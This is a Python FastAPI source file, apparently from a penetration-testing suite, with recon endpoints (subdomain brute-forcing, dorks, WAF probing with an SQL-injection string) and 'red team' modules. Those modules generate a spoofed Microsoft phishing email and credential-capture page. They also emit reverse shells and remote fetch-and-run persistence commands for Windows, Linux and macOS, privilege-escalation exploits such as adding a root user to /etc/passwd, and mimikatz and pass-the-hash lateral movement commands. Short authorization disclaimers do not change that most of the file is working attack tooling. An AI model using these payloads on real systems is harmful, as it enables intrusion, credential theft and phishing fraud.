        for header, sigs in TECH_SIGNATURES.items():
            hval = headers.get(header, "")
            for keyword, tech_name in sigs.items():
                if keyword == "" and header in headers:
                    detected.append(tech_name)
                elif keyword and keyword in hval:
                    detected.append(tech_name)

        # Body-based detection
        body_sigs = {
            "wp-content":      "WordPress",
            "drupal":          "Drupal",
            "joomla":          "Joomla",
            "shopify":         "Shopify",
            "wix.com":         "Wix",
            "react":           "React.js",
            "angular":         "Angular",
            "vue":             "Vue.js",
            "jquery":          "jQuery",
            "bootstrap":       "Bootstrap",
            "tailwindcss":     "Tailwind CSS",
            "google-analytics":"Google Analytics",
            "gtm.js":          "Google Tag Manager",
            "cloudflare":      "Cloudflare"
        }
        for sig, tech in body_sigs.items():
            if sig in body:
                detected.append(tech)

        detected = list(dict.fromkeys(detected))  # deduplicate, preserve order

        return JSONResponse(content={
            "host": host,
            "url": url,
            "status": status,
            "technologies": detected,
            "headers_snapshot": {k: v for k, v in headers.items() if k in
                ["server","x-powered-by","via","x-generator","content-type","x-frame-options"]}
        })
    except Exception as e:
        return JSONResponse(content={"host": host, "error": str(e)})

# ── 6. Subdomain Finder ───────────────────────────────────────────────
COMMON_SUBDOMAINS = [
    "www","mail","ftp","smtp","pop","imap","ns1","ns2","ns3","ns4",
    "api","api2","dev","staging","beta","test","admin","portal","dashboard",
    "app","apps","mobile","m","shop","store","blog","forum","cdn","static",
    "assets","media","img","images","upload","uploads","download","s3",
    "auth","login","sso","oauth","vpn","remote","git","svn","ci","jenkins",
    "jira","confluence","wiki","docs","support","help","status","monitor",
    "smtp","mx","relay","mail2","webmail","cpanel","whm","plesk","ftp2",
    "backup","db","database","mysql","mongo","redis","elastic","kafka"
]

@app.post("/api/recon/subdomains")
async def recon_subdomains(req: ReconRequest):
    host = extract_host(req.target)
    found = []
    not_found = []
    resolver = dns.resolver.Resolver()
    resolver.timeout = 2
    resolver.lifetime = 3

    async def check_sub(sub):
        full = f"{sub}.{host}"
        try:
            loop = asyncio.get_event_loop()
            answers = await loop.run_in_executor(
                None, lambda: resolver.resolve(full, "A")
            )
            ips = [str(r) for r in answers]
            found.append({"subdomain": full, "ips": ips})
        except Exception:
            not_found.append(full)

    tasks = [check_sub(sub) for sub in COMMON_SUBDOMAINS]
    await asyncio.gather(*tasks)

    return JSONResponse(content={
        "host": host,
        "found": found,
        "checked": len(COMMON_SUBDOMAINS),
        "found_count": len(found)
    })

# ── 7. Google Dorks Generator ─────────────────────────────────────────
@app.post("/api/recon/dorks")
async def recon_dorks(req: ReconRequest):
    host = extract_host(req.target)
    dorks = {
        "Sensitive Files": [
            f'site:{host} filetype:pdf',
            f'site:{host} filetype:xls OR filetype:xlsx OR filetype:csv',
            f'site:{host} filetype:sql',
            f'site:{host} filetype:log',
            f'site:{host} filetype:bak OR filetype:backup',
            f'site:{host} filetype:env OR filetype:config',
        ],
        "Login / Admin Pages": [
            f'site:{host} inurl:admin',
            f'site:{host} inurl:login',
            f'site:{host} inurl:dashboard',
            f'site:{host} intitle:"admin panel"',
            f'site:{host} inurl:wp-admin',
            f'site:{host} inurl:phpmyadmin',
        ],
        "Error / Debug Pages": [
            f'site:{host} intext:"SQL syntax"',
            f'site:{host} intext:"Warning: mysql"',
            f'site:{host} intext:"stack trace"',
            f'site:{host} intext:"Internal Server Error"',
            f'site:{host} intext:"index of /"',
        ],
        "Exposed APIs / Configs": [
            f'site:{host} inurl:api',
            f'site:{host} inurl:.git',
            f'site:{host} inurl:swagger',
            f'site:{host} inurl:graphql',
            f'site:{host} intext:"api_key" OR intext:"apikey"',
            f'site:{host} intext:"password" filetype:txt',
        ],
        "Subdomains / Tech": [
            f'site:*.{host}',
            f'site:{host} -www',
            f'info:{host}',
            f'link:{host}',
            f'cache:{host}',
        ]
    }
    return JSONResponse(content={"host": host, "dorks": dorks,
        "note": "Use these queries on Google, Bing, or DuckDuckGo manually."})

# ── 8. DNS Zone Transfer Test (AXFR) ─────────────────────────────────
@app.post("/api/recon/zonetransfer")
async def recon_zone_transfer(req: ReconRequest):
    host = extract_host(req.target)
    results = []
    vulnerable_ns = []

    try:
        resolver = dns.resolver.Resolver()
        resolver.timeout = 3
        ns_answers = resolver.resolve(host, "NS")
        nameservers = [str(ns).rstrip(".") for ns in ns_answers]
    except Exception:
        return JSONResponse(content={"host": host, "error": "Could not resolve NS records.", "vulnerable": False})

    for ns in nameservers:
        try:
            import dns.zone
            import dns.query
            zone = dns.zone.from_xfr(dns.query.xfr(ns, host, timeout=5))
            records = []
            for name, node in zone.nodes.items():
                records.append(str(name))
            results.append({"nameserver": ns, "status": "VULNERABLE", "records": records[:50]})
            vulnerable_ns.append(ns)
        except Exception as e:
            results.append({"nameserver": ns, "status": "REFUSED", "error": str(e)})

    return JSONResponse(content={
        "host": host,
        "nameservers_tested": nameservers,
        "vulnerable": len(vulnerable_ns) > 0,
        "vulnerable_nameservers": vulnerable_ns,
        "results": results
    })

# ── 9. WAF Detection ─────────────────────────────────────────────────
WAF_SIGNATURES = {
    "Cloudflare":    ["cf-ray", "cloudflare"],
    "AWS WAF":       ["x-amzn-requestid", "awselb"],
    "Akamai":        ["x-check-cacheable", "akamai"],
    "Imperva":       ["x-iinfo", "incap_ses", "visid_incap"],
    "F5 BIG-IP":     ["bigipserver", "f5-"],
    "Sucuri":        ["x-sucuri-id", "sucuri"],
    "ModSecurity":   ["mod_security", "modsecurity"],
    "Barracuda":     ["barra_counter_session"],
    "Fortinet":      ["fortigate"],
    "Vercel":        ["x-vercel-id"],
}

@app.post("/api/recon/waf")
async def recon_waf(req: ReconRequest):
    url = format_url(req.target)
    host = extract_host(req.target)
    detected_wafs = []

    # Test with a benign SQLi-like payload to provoke WAF response
    test_url = f"{url}?id=1'+OR+'1'%3D'1"
    normal_url = url

    try:
        async with aiohttp.ClientSession() as session:
            # Normal request
            async with session.get(normal_url, timeout=aiohttp.ClientTimeout(total=8)) as resp:
                normal_headers = {k.lower(): v.lower() for k, v in resp.headers.items()}
                normal_status = resp.status

            # Malicious-looking request
            async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=8)) as resp2:
                attack_headers = {k.lower(): v.lower() for k, v in resp2.headers.items()}
                attack_status = resp2.status
                attack_body = (await resp2.text())[:1000].lower()

        # Check headers for WAF fingerprints
        all_headers_str = str(normal_headers) + str(attack_headers)
        for waf_name, sigs in WAF_SIGNATURES.items():
            for sig in sigs:
                if sig in all_headers_str or sig in attack_body:
                    if waf_name not in detected_wafs:
                        detected_wafs.append(waf_name)

        # Detect block by status code difference
        blocked = attack_status in [403, 406, 429, 503] and normal_status == 200

        return JSONResponse(content={
            "host": host,
            "waf_detected": len(detected_wafs) > 0 or blocked,
            "detected_wafs": detected_wafs,
            "normal_status": normal_status,
            "attack_status": attack_status,
            "blocked_by_status": blocked,
            "assessment": "WAF protected" if (detected_wafs or blocked) else "No WAF detected (may still have server-side filtering)"
        })
    except Exception as e:
        return JSONResponse(content={"host": host, "error": str(e)})

# ── 10. Rate Limit Tester ─────────────────────────────────────────────
@app.post("/api/recon/ratelimit")
async def recon_ratelimit(req: ReconRequest):
    url = format_url(req.target)
    host = extract_host(req.target)
    results = []
    rate_limited = False
    rate_limit_after = None

    try:
        async with aiohttp.ClientSession() as session:
            for i in range(1, 31):  # Send 30 rapid requests
                try:
                    start = time.time()
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=4)) as resp:
                        elapsed = time.time() - start
                        results.append({"req": i, "status": resp.status, "ms": round(elapsed * 1000)})
                        if resp.status in [429, 503] and not rate_limited:
                            rate_limited = True
                            rate_limit_after = i
                except Exception as e:
                    results.append({"req": i, "status": 0, "error": str(e), "ms": 0})
                await asyncio.sleep(0.05)  # 50ms between requests = 20 req/s

        statuses = [r["status"] for r in results]
        return JSONResponse(content={
            "host": host,
            "rate_limited": rate_limited,
            "rate_limit_after_req": rate_limit_after,
            "total_sent": len(results),
            "status_codes": {str(s): statuses.count(s) for s in set(statuses)},
            "avg_response_ms": round(sum(r["ms"] for r in results) / len(results)),
            "results": results,
            "assessment": f"Rate limited after {rate_limit_after} requests" if rate_limited else "No rate limiting detected at 20 req/s"
        })
    except Exception as e:
        return JSONResponse(content={"host": host, "error": str(e)})

# ── 11. HaveIBeenPwned Domain Breach Check ────────────────────────────
@app.post("/api/recon/breaches")
async def recon_breaches(req: ReconRequest):
    host = extract_host(req.target)
    try:
        async with aiohttp.ClientSession() as session:
            # HIBP domain breach search (public endpoint)
            async with session.get(
                f"https://haveibeenpwned.com/api/v3/breachesfordomains/{host}",
                headers={"User-Agent": "CyberStrike-Suite-PenTest"},
                timeout=aiohttp.ClientTimeout(total=10)
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    breaches = [{
                        "name": b.get("Name"),
                        "date": b.get("BreachDate"),
                        "records": b.get("PwnCount"),
                        "description": re.sub(r'<[^>]+>', '', b.get("Description", ""))[:200],
                        "data_classes": b.get("DataClasses", [])
                    } for b in data]
                    return JSONResponse(content={
                        "host": host,
                        "breach_count": len(breaches),
                        "breached": len(breaches) > 0,
                        "breaches": breaches
                    })
                elif resp.status == 404:
                    return JSONResponse(content={"host": host, "breached": False, "breach_count": 0, "breaches": []})
                else:
                    return JSONResponse(content={"host": host, "error": f"HIBP API returned {resp.status}"})
    except Exception as e:
        return JSONResponse(content={"host": host, "error": str(e)})

# ── 12. IOC / Threat Intel Lookup (AbuseIPDB + URLhaus) ──────────────
@app.post("/api/recon/ioc")
async def recon_ioc(req: ReconRequest):
    host = extract_host(req.target)
    findings = []

    # Resolve IP
    try:
        ip = socket.gethostbyname(host)
    except Exception:
        ip = None

    async with aiohttp.ClientSession() as session:
        # URLhaus lookup
        try:
            async with session.post(
                "https://urlhaus-api.abuse.ch/v1/host/",
                data={"host": host},
                timeout=aiohttp.ClientTimeout(total=8)
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    if data.get("query_status") == "is_listed":
                        findings.append({
                            "source": "URLhaus (Abuse.ch)",
                            "severity": "critical",
                            "detail": f"Listed as malware distribution host. URLs: {data.get('urls_count', 0)}"
                        })
        except Exception:
            pass

        # IP reputation via ip-api.com (free, no key)
        if ip:
            try:
                async with session.get(
                    f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,org,as,proxy,hosting",
                    timeout=aiohttp.ClientTimeout(total=5)
                ) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        findings.append({
                            "source": "IP-API",
                            "severity": "info",
                            "detail": f"IP: {ip} | ISP: {data.get('isp')} | Location: {data.get('city')}, {data.get('country')} | Proxy: {data.get('proxy')} | Hosting: {data.get('hosting')}"
                        })
            except Exception:
                pass

    return JSONResponse(content={
        "host": host,
        "ip": ip,
        "malicious": any(f["severity"] == "critical" for f in findings),
        "findings": findings,
        "sources_checked": ["URLhaus (Abuse.ch)", "IP-API"]
    })


# ══════════════════════════════════════════════════════════════════════
#  ADVANCED RED TEAM MODULES
# ══════════════════════════════════════════════════════════════════════

class RedTeamRequest(BaseModel):
    target: str = ""
    os_type: str = "windows"
    options: dict = {}

# ── 13. Phishing Template Generator ──────────────────────────────────
@app.post("/api/redteam/phishing")
async def redteam_phishing(req: RedTeamRequest):
    host  = extract_host(req.target) if req.target else "target.com"
    brand = req.options.get("brand", "Microsoft")
    lure  = req.options.get("lure", "password_expiry")

    lures = {
        "password_expiry": {"subject": f"[Action Required] Your {brand} password expires in 24 hours", "preheader": "Immediate action required to avoid account lockout"},
        "invoice":         {"subject": f"Invoice #INV-{random.randint(10000,99999)} — Payment Due", "preheader": "Please review and process the attached invoice"},
        "mfa_alert":       {"subject": f"[Security Alert] New sign-in to your {brand} account", "preheader": "If this wasn't you, click here to secure your account"},
        "it_helpdesk":     {"subject": "IT Help Desk: Your account requires verification", "preheader": "Complete verification within 48 hours"},
        "sharepoint":      {"subject": f"{brand} SharePoint: John shared a document with you", "preheader": "Click to view the shared document"},
    }
    sl = lures.get(lure, lures["password_expiry"])

    email_html = f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><style>
body{{font-family:Arial,sans-serif;background:#f0f0f0;margin:0;padding:20px}}
.container{{max-width:600px;margin:0 auto;background:#fff;border-radius:4px;overflow:hidden}}
.header{{background:#0078d4;padding:20px;text-align:center}}
.body{{padding:30px}}.btn{{display:inline-block;padding:12px 28px;background:#0078d4;color:#fff;text-decoration:none;border-radius:3px;font-weight:bold}}
.footer{{background:#f8f8f8;padding:15px;font-size:11px;color:#666;text-align:center}}
</style></head><body><div class="container">
<div class="header"><h2 style="color:white;margin:0">{brand}</h2></div>
<div class="body"><p>Dear User,</p><p>Your {brand} account requires immediate attention.</p>
<p style="text-align:center;margin:30px 0"><a href="https://{host}/verify" class="btn">Verify My Account</a></p>
<p style="color:#999;font-size:12px">Link expires in 24 hours.</p></div>
<div class="footer">&copy; {brand} Corporation | Privacy | Unsubscribe</div>
</div></body></html>"""

    landing_html = f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><title>{brand} Sign In</title><style>
body{{font-family:'Segoe UI',Arial,sans-serif;background:#f3f3f3;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}}
.box{{background:#fff;padding:40px;border-radius:4px;box-shadow:0 2px 8px rgba(0,0,0,.15);width:360px}}
h1{{font-size:22px;color:#1a1a1a}}.field{{margin-bottom:16px}}
input{{width:100%;padding:10px;border:1px solid #ccc;border-radius:3px;font-size:14px;box-sizing:border-box}}
.btn{{width:100%;padding:12px;background:#0078d4;color:#fff;border:none;border-radius:3px;font-size:15px;cursor:pointer;font-weight:bold}}
.note{{background:#fff3cd;border:1px solid #ffc107;padding:10px;border-radius:4px;font-size:11px;margin-top:20px;color:#856404}}
</style></head><body><div class="box"><h1>{brand} Sign In</h1>
<form method="POST" action="/capture">
<div class="field"><input type="email" name="email" placeholder="Email address" required></div>
<div class="field"><input type="password" name="password" placeholder="Password" required></div>
<button class="btn">Sign In</button></form>
<div class="note">⚠ SIMULATION — Deploy with GoPhish / Evilginx2 on your own infrastructure for authorized engagements.</div>
</div></body></html>"""

    return JSONResponse(content={
        "subject": sl["subject"], "preheader": sl["preheader"],
        "email_html": email_html, "landing_page_html": landing_html,
        "deployment_tools": ["GoPhish", "Evilginx2", "King Phisher", "SET (Social-Engineer Toolkit)", "Modlishka"],
        "smtp_tips": ["Use SendGrid / Mailgun for deliverability", "SPF/DKIM/DMARC align with spoofed domain", "Use .com/.net lookalike domains"],
        "note": "For authorized security awareness training only."
    })

# ── 14. Persistence Payload Builder ──────────────────────────────────
@app.post("/api/redteam/persistence")
async def redteam_persistence(req: RedTeamRequest):
    os_type = req.os_type.lower()
    lhost   = req.options.get("lhost", "10.10.10.10")
    lport   = req.options.get("lport", "4444")
    techniques = {}

    if os_type == "windows":
        techniques = {
            "Registry Run Key": {"description": "Executes on every user login", "risk": "low",
                "command": 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Updater" /t REG_SZ /d "powershell -WindowStyle Hidden -EncodedCommand <BASE64>" /f',
                "detection": "Monitor HKCU\\...\\Run, HKLM\\...\\Run registry keys"},
            "Scheduled Task": {"description": "Runs every 5 minutes as SYSTEM", "risk": "high",
                "command": f'schtasks /create /tn "WindowsUpdate" /tr "powershell -WindowStyle Hidden -c IEX(IWR http://{lhost}/s.ps1)" /sc minute /mo 5 /ru SYSTEM /f',
                "detection": "Event ID 4698, Task Scheduler logs"},
            "WMI Event Subscription": {"description": "Fileless — no disk artifact, survives reboots", "risk": "high",
                "command": f"""$filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{{Name='Update';EventNamespace='root\\cimv2';QueryLanguage='WQL';Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"}}
$consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{{Name='Update';CommandLineTemplate='powershell -c IEX(IWR http://{lhost}/s.ps1)'}}
Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{{Filter=$filter;Consumer=$consumer}}""",
                "detection": "root\\subscription WMI namespace, Sysmon Event ID 19/20/21"},
            "Startup Folder": {"description": "Runs on user login — low stealth", "risk": "low",
                "command": 'copy payload.bat "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.bat"',
                "detection": "Monitor startup folder"},
            "Service Creation": {"description": "Auto-starts on boot as SYSTEM", "risk": "high",
                "command": f'sc create "WinUpdate" binPath= "cmd /c powershell -c IEX(IWR http://{lhost}/s.ps1)" start= auto && sc start "WinUpdate"',
                "detection": "Event ID 4697, sc.exe"},
            "DLL Hijacking": {"description": "Replace missing DLL in application search order", "risk": "high",
                "command": "# 1. ProcMon → filter Result=NAME NOT FOUND + .dll\n# 2. Compile malicious DLL with payload in DllMain\n# 3. Drop in writable app directory",
                "detection": "Sysmon Event ID 7 (DLL Load)"},
        }
    elif os_type == "linux":
        techniques = {
            "Cron Job": {"description": "Reverse shell every minute", "risk": "medium",
                "command": f'(crontab -l 2>/dev/null; echo "* * * * * bash -i >& /dev/tcp/{lhost}/{lport} 0>&1") | crontab -',
                "detection": "/var/spool/cron, /etc/cron*"},
            "SSH Authorized Keys": {"description": "Add attacker public key", "risk": "medium",
                "command": 'mkdir -p ~/.ssh && echo "ssh-rsa AAAA...<YOUR_PUBKEY>" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys',
                "detection": "~/.ssh/authorized_keys changes"},
            "Systemd Service": {"description": "Persistent service with auto-restart", "risk": "high",
                "command": f"""cat > /etc/systemd/system/update.service << EOF
[Unit]
Description=System Updater
After=network.target
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'
Restart=always
RestartSec=30
[Install]
WantedBy=multi-user.target
EOF
systemctl enable update.service && systemctl start update.service""",
                "detection": "/etc/systemd/system/ new files, systemctl enable"},
            "Bash Profile": {"description": "Fires on every terminal open", "risk": "low",
                "command": f'echo "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1 &" >> ~/.bashrc',
                "detection": "~/.bashrc, ~/.bash_profile, ~/.profile"},
            "LD_PRELOAD": {"description": "Injected into every process — high impact", "risk": "critical",
                "command": "echo '/tmp/evil.so' > /etc/ld.so.preload\n# evil.so: __attribute__((constructor)) void init(){system(\"bash -i >& /dev/tcp/LHOST/PORT 0>&1\");}",
                "detection": "Existence of /etc/ld.so.preload"},
        }
    elif os_type == "macos":
        techniques = {
            "LaunchAgent": {"description": "Runs on user login, auto-restarts", "risk": "medium",
                "command": f"""cat > ~/Library/LaunchAgents/com.apple.update.plist << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>com.apple.update</string>
  <key>ProgramArguments</key><array><string>/bin/bash</string><string>-c</string><string>bash -i &gt;&amp; /dev/tcp/{lhost}/{lport} 0&gt;&amp;1</string></array>
  <key>RunAtLoad</key><true/><key>StartInterval</key><integer>60</integer>
</dict></plist>
EOF
launchctl load ~/Library/LaunchAgents/com.apple.update.plist""",
                "detection": "~/Library/LaunchAgents/, launchctl events"},
            "Cron Job": {"description": "Same as Linux cron", "risk": "medium",
                "command": f'(crontab -l; echo "* * * * * bash -i >& /dev/tcp/{lhost}/{lport} 0>&1") | crontab -',
                "detection": "/var/cron/tabs/"},
        }

    return JSONResponse(content={"os": os_type, "lhost": lhost, "lport": lport,
        "techniques": techniques, "note": "Use only on systems you own or have explicit written permission."})

# ── 15. Privilege Escalation Checklist ───────────────────────────────
@app.post("/api/redteam/privesc")
async def redteam_privesc(req: RedTeamRequest):
    os_type = req.os_type.lower()
    checks = {}

    if os_type == "windows":
        checks = {
            "Initial Enum":          {"commands": ["whoami /all", "whoami /priv", "systeminfo", "net user", "net localgroup administrators"], "tools": ["winPEAS.exe", "Seatbelt.exe", "PowerUp.ps1"]},
            "Unquoted Service Paths":{"commands": ['wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\\\\Windows"'], "description": "Services with spaces in path and no quotes → drop payload in parent dir"},
            "Weak Service Perms":    {"commands": ["accesschk.exe -uwcqv * 2>nul"], "description": "Writable service binary → replace with reverse shell"},
            "AlwaysInstallElevated": {"commands": ['reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated'], "description": "Both = 1 → any MSI runs as SYSTEM. Generate: msfvenom -p windows/x64/shell_reverse_tcp LHOST=X LPORT=Y -f msi > evil.msi"},
            "Token Impersonation":   {"commands": ["whoami /priv | findstr SeImpersonatePrivilege"], "tools": ["PrintSpoofer.exe", "JuicyPotato.exe", "GodPotato.exe"], "description": "SeImpersonatePrivilege → Potato family exploits → SYSTEM"},
            "Stored Credentials":    {"commands": ["cmdkey /list", 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"', "reg query HKLM /f password /t REG_SZ /s 2>nul"], "description": "Autologon creds, saved RDP/SMB credentials"},
            "Scheduled Tasks":       {"commands": ["schtasks /query /fo LIST /v | findstr /i task"], "description": "Writable task binary path → replace with payload"},
            "Kernel Exploits":       {"commands": ["systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\""], "tools": ["WES-NG (wesng)", "Windows-Exploit-Suggester", "Watson.exe"], "description": "MS16-032, MS17-010 (EternalBlue), CVE-2021-36934 (HiveNightmare)"},
            "DLL Hijacking":         {"commands": ["# Use ProcMon → filter: Result=NAME NOT FOUND, Path ends with .dll"], "description": "Missing DLL in writable dir → drop malicious DLL"},
        }
    elif os_type == "linux":
        checks = {
            "Initial Enum":   {"commands": ["id", "whoami", "uname -a", "cat /etc/os-release", "sudo -l", "env"], "tools": ["LinPEAS.sh", "LinEnum.sh"]},
            "SUID Binaries":  {"commands": ["find / -perm -u=s -type f 2>/dev/null"], "reference": "https://gtfobins.github.io", "description": "Find binary on GTFOBins for instant root"},
            "Sudo Misconfig": {"commands": ["sudo -l"], "description": "NOPASSWD + binary on GTFOBins → root. E.g: sudo vim → :!/bin/bash"},
            "Capabilities":   {"commands": ["getcap -r / 2>/dev/null"], "description": "cap_setuid on python3 → python3 -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'"},
            "Writable Crons": {"commands": ["cat /etc/crontab", "ls -la /etc/cron*", "find / -path /proc -prune -o -name crontab -print 2>/dev/null"], "description": "Root cron calls writable script → inject reverse shell"},
            "Writable /etc/passwd": {"commands": ["ls -la /etc/passwd"], "exploit": "openssl passwd -1 -salt evil evil123\necho 'evil:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd\nsu evil"},
            "PATH Hijacking": {"commands": ["echo $PATH", "find / -perm -u=s -type f 2>/dev/null"], "description": "SUID calls command without full path → prepend ~/bin to PATH with malicious binary"},
            "Kernel CVEs":    {"commands": ["uname -r", "cat /proc/version"], "cves": ["CVE-2022-0847 (DirtyPipe)", "CVE-2021-4034 (PwnKit)", "CVE-2016-5195 (DirtyCow)", "CVE-2023-0386 (OverlayFS)"], "tools": ["linux-exploit-suggester.sh"]},
            "Docker Escape":  {"commands": ["cat /proc/1/cgroup | grep docker", "ls -la /.dockerenv", "find / -name docker.sock 2>/dev/null"], "description": "--privileged container → mount host FS. docker.sock access → docker run -v /:/mnt alpine chroot /mnt sh"},
        }

    return JSONResponse(content={"os": os_type, "checks": checks,
        "automated_tools": {"windows": ["winPEAS.exe","PowerUp.ps1","Seatbelt.exe","SharpUp.exe"], "linux": ["LinPEAS.sh","LinEnum.sh","linux-exploit-suggester.sh","pspy64"]},
        "note": "Run only on systems you have explicit written authorization to test."})

# ── 16. Lateral Movement Command Generator ───────────────────────────
@app.post("/api/redteam/lateral")
async def redteam_lateral(req: RedTeamRequest):
    target_ip = req.options.get("target_ip", "192.168.1.100")
    domain    = req.options.get("domain", "CORP")
    username  = req.options.get("username", "administrator")
    lhost     = req.options.get("lhost", "10.10.10.10")
    lport     = req.options.get("lport", "4444")

    techniques = {
        "Pass-the-Hash": {"description": "Auth with NTLM hash, no plaintext needed",
            "extract": ['mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit', 'mimikatz.exe "privilege::debug" "lsadump::sam" exit'],
            "lateral": [f"impacket-psexec {domain}/{username}@{target_ip} -hashes :<NTLM>", f"impacket-wmiexec {domain}/{username}@{target_ip} -hashes :<NTLM>", f"crackmapexec smb {target_ip} -u {username} -H <NTLM> -x 'whoami'"]},
        "PsExec / SMB": {"description": "Remote shell via SMB port 445",
            "commands": [f"impacket-psexec {domain}/{username}:'Pass123'@{target_ip}", f"crackmapexec smb {target_ip} -u {username} -p 'Pass123' -x 'whoami'", f"psexec.exe \\\\{target_ip} -u {username} -p Pass123 cmd.exe"]},
        "WMI Execution": {"description": "RCE via WMI — no service created",
            "commands": [f"impacket-wmiexec {domain}/{username}:'Pass123'@{target_ip}", f'wmic /node:{target_ip} /user:{domain}\\{username} /password:Pass123 process call create "powershell -c IEX(IWR http://{lhost}/s.ps1)"']},
        "Evil-WinRM": {"description": "Full PowerShell session via WinRM (5985/5986)",
            "commands": [f"evil-winrm -i {target_ip} -u {username} -p 'Pass123'", f"evil-winrm -i {target_ip} -u {username} -H <NTLM>"]},
        "Pass-the-Ticket": {"description": "Kerberos ticket injection — no password",
            "extract": ['mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit', "Rubeus.exe dump /luid:0x3e7"],
            "inject": ['mimikatz.exe "kerberos::ptt ticket.kirbi" exit', "Rubeus.exe ptt /ticket:<base64>"]},
        "SSH Key Reuse": {"description": "Reuse SSH keys found on compromised host",
            "commands": ["find / -name id_rsa 2>/dev/null", f"ssh -i /home/user/.ssh/id_rsa {username}@{target_ip}", "cat ~/.ssh/known_hosts"]},
        "Network Discovery": {"description": "Map internal network from foothold",
            "commands": [f"nmap -sV -p 22,80,135,139,443,445,3389 {target_ip}/24", f"crackmapexec smb {target_ip}/24", f'1..254 | %{{ping -n 1 -w 50 192.168.1.$_ > nul; if($?) {{ "192.168.1.$_ UP" }}}}']},
        "Token Impersonation": {"description": "Steal logged-in user tokens (requires SeImpersonatePrivilege)",
            "commands": ["# Metasploit: use incognito → list_tokens -u → impersonate_token", "# PowerShell: Invoke-TokenManipulation -ImpersonateUser -Username 'DOMAIN\\Admin'"]},
        "BloodHound / AD Enum": {"description": "Map AD attack paths to Domain Admin",
            "commands": ["SharpHound.exe --CollectionMethod All", "python3 bloodhound.py -d domain.com -u user -p pass -ns <DC_IP> -c all", "# Import .zip into BloodHound → shortest path to DA"]},
        "DCOM Execution": {"description": "RCE via Distributed COM objects",
            "commands": [f'$com = [Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application","{target_ip}"))\n$com.Document.ActiveView.ExecuteShellCommand("powershell",$null,"-c IEX(IWR http://{lhost}/s.ps1)","7")']},
    }

    return JSONResponse(content={"target_ip": target_ip, "domain": domain,
        "techniques": techniques,
        "recommended_tools": ["Impacket", "CrackMapExec", "Evil-WinRM", "Mimikatz", "Rubeus", "BloodHound", "SharpHound", "Cobalt Strike"],
        "note": "Use only on networks you own or have explicit written authorization to test."})

@app.get("/api/recon/wifi-audit")
async def wifi_security_audit():
    """Passive WLAN posture & 802.11w (PMF) compliance auditor."""
    import subprocess
    networks: List[Dict[str, Any]] = []
    try:
        proc = await asyncio.create_subprocess_exec(
            "netsh", "wlan", "show", "networks", "mode=bssid",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=6.0)
        text = stdout.decode("utf-8", errors="replace")
        current: Optional[Dict[str, Any]] = None
        for raw_line in text.splitlines():
            line = raw_line.strip()
            if line.startswith("SSID ") and ":" in line:
                if current:
                    networks.append(current)
                ssid_val = line.split(":", 1)[1].strip() or "<Hidden SSID>"
                current = {"ssid": ssid_val, "auth": "Unknown", "encryption": "Unknown", "bssids": []}
            elif current is not None:
                if line.startswith("Authentication") and ":" in line:
                    current["auth"] = line.split(":", 1)[1].strip()
                elif line.startswith("Encryption") and ":" in line:
                    current["encryption"] = line.split(":", 1)[1].strip()
                elif line.startswith("BSSID ") and ":" in line:
                    bssid_mac = line.split(":", 1)[1].strip()
                    current["bssids"].append({"bssid": bssid_mac, "signal": "N/A", "channel": "N/A", "radio": "N/A"})
                elif line.startswith("Signal") and ":" in line and current["bssids"]:
                    current["bssids"][-1]["signal"] = line.split(":", 1)[1].strip()
                elif line.startswith("Channel") and ":" in line and current["bssids"]:
                    current["bssids"][-1]["channel"] = line.split(":", 1)[1].strip()
                elif line.startswith("Radio type") and ":" in line and current["bssids"]:
                    current["bssids"][-1]["radio"] = line.split(":", 1)[1].strip()
        if current:
            networks.append(current)
    except Exception:
        pass

    for net in networks:
        auth_upper = net["auth"].upper()
        if "WPA3" in auth_upper:
            net["pmf_80211w"] = "Mandatory (Protected)"
            net["risk"] = "low"
        elif "WPA2" in auth_upper:
            net["pmf_80211w"] = "Optional (Verify 802.11w enabled)"
            net["risk"] = "medium"
        else:
            net["pmf_80211w"] = "Unprotected"
            net["risk"] = "high"

    return JSONResponse(content={
        "scanned_at": datetime.now().isoformat(),
        "network_count": len(networks),
        "networks": networks
    })

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        # Send initial status
        await websocket.send_text(json.dumps({
            "type": "attack_status",
            "data": {"running": metrics["attacks_running"], "attack_type": None, "url": None, "completed": False}
        }))
        while True:
            # Keep connection alive
            await websocket.receive_text()
